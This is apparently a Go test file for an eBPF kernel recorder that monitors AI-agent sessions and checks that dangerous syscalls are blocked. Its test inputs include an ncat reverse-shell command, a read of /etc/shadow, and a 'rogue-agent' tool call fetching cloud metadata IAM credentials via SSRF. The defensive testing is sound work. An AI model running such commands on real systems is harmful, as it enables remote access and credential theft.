package tests

import (
	"strings"
	"testing"
	"time"

	"github.com/Noooblien/agentvcr/pkg/ebpf"
	"github.com/Noooblien/agentvcr/pkg/trace"
)

func TestEBPF_SocketInterceptAndSSRFBlock(t *testing.T) {
	cfg := ebpf.DefaultEBPFConfig()
	kr := ebpf.NewKernelRecorder("test_session_ebpf", cfg)

	// Case 1: Benign connection to OpenAI API
	ev1 := kr.InterceptSocket(1, 1001, "python3", "tcp", "10.0.0.5", 41234, "104.18.7.192", 443, "api.openai.com", 2048, 8192)
	if ev1.ActionBlocked {
		t.Errorf("benign egress connection should not be blocked: %+v", ev1)
	}
	if ev1.ReturnValue != 0 {
		t.Errorf("expected return value 0, got %d", ev1.ReturnValue)
	}

	// Case 2: Cloud metadata SSRF attempt
	ev2 := kr.InterceptSocket(2, 1001, "python3", "tcp", "10.0.0.5", 41235, "169.254.169.254", 80, "169.254.169.254", 512, 0)
	if !ev2.ActionBlocked {
		t.Errorf("metadata IP 169.254.169.254 must be blocked by eBPF probe")
	}
	if ev2.ReturnValue != -1 {
		t.Errorf("expected -1 EPERM on blocked socket, got %d", ev2.ReturnValue)
	}
	if ev2.TamperRisk != "critical" {
		t.Errorf("expected critical risk on SSRF, got %s", ev2.TamperRisk)
	}
}

func TestEBPF_ExecveAndSensitiveFileAccess(t *testing.T) {
	cfg := ebpf.DefaultEBPFConfig()
	kr := ebpf.NewKernelRecorder("test_session_security", cfg)

	// Case 1: Forbidden utility execution (e.g. netcat / ncat)
	ev1 := kr.InterceptExecve(1, 2001, "/usr/bin/ncat", []string{"-e", "/bin/sh", "1.2.3.4", "4444"})
	if !ev1.ActionBlocked {
		t.Errorf("ncat execution must be intercepted and blocked by eBPF probe")
	}
	if ev1.ReturnValue != -13 {
		t.Errorf("expected -13 EACCES, got %d", ev1.ReturnValue)
	}

	// Case 2: Access to protected /etc/shadow
	ev2 := kr.InterceptFileIO(2, 2001, "cat", "/etc/shadow", false)
	if !ev2.ActionBlocked {
		t.Errorf("access to /etc/shadow must be blocked by eBPF probe")
	}
	if ev2.TamperRisk != "critical" {
		t.Errorf("expected critical risk on /etc/shadow access")
	}

	// Case 3: Benign file access
	ev3 := kr.InterceptFileIO(3, 2001, "go", "/home/slayer28/workspace/main.go", true)
	if ev3.ActionBlocked {
		t.Errorf("benign file write should not be blocked")
	}
}

func TestEBPF_SimulateSessionEBPFAndScorecard(t *testing.T) {
	cfg := ebpf.DefaultEBPFConfig()

	// Clean session
	cleanSession := &trace.Session{
		ID:        "session_clean_kernel",
		AgentName: "code-assistant",
		CreatedAt: time.Now(),
		Events: []trace.TraceEvent{
			{
				Index: 1,
				Type:  trace.EventToolCall,
				Payload: map[string]interface{}{
					"tool": "web_fetch",
					"args": map[string]interface{}{
						"url": "https://api.openai.com/v1/models",
					},
				},
			},
			{
				Index: 2,
				Type:  trace.EventToolCall,
				Payload: map[string]interface{}{
					"tool": "bash",
					"args": map[string]interface{}{
						"command": "go test ./...",
					},
				},
			},
		},
	}

	_, cleanReport := ebpf.SimulateSessionEBPF(cleanSession, cfg)
	if !cleanReport.Passed || cleanReport.BlockedSyscallsCount > 0 {
		t.Errorf("clean session should pass eBPF kernel audit: %+v", cleanReport)
	}

	// Malicious session with SSRF attempt
	maliciousSession := &trace.Session{
		ID:        "session_malicious_kernel",
		AgentName: "rogue-agent",
		CreatedAt: time.Now(),
		Events: []trace.TraceEvent{
			{
				Index: 1,
				Type:  trace.EventToolCall,
				Payload: map[string]interface{}{
					"tool": "http_request",
					"args": map[string]interface{}{
						"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials",
					},
				},
			},
		},
	}

	_, rogueReport := ebpf.SimulateSessionEBPF(maliciousSession, cfg)
	if rogueReport.Passed {
		t.Errorf("malicious session must fail eBPF audit due to SSRF")
	}
	if rogueReport.SSRFAttemptsCount != 1 {
		t.Errorf("expected 1 SSRF attempt, got %d", rogueReport.SSRFAttemptsCount)
	}

	scorecard := ebpf.RenderEBPFScorecard(rogueReport)
	if !strings.Contains(scorecard, "AGENTVCR EPHEMERAL eBPF KERNEL") {
		t.Errorf("scorecard missing header: %s", scorecard)
	}
	if !strings.Contains(scorecard, "[FAIL]") {
		t.Errorf("rogue scorecard should display FAIL: %s", scorecard)
	}
}
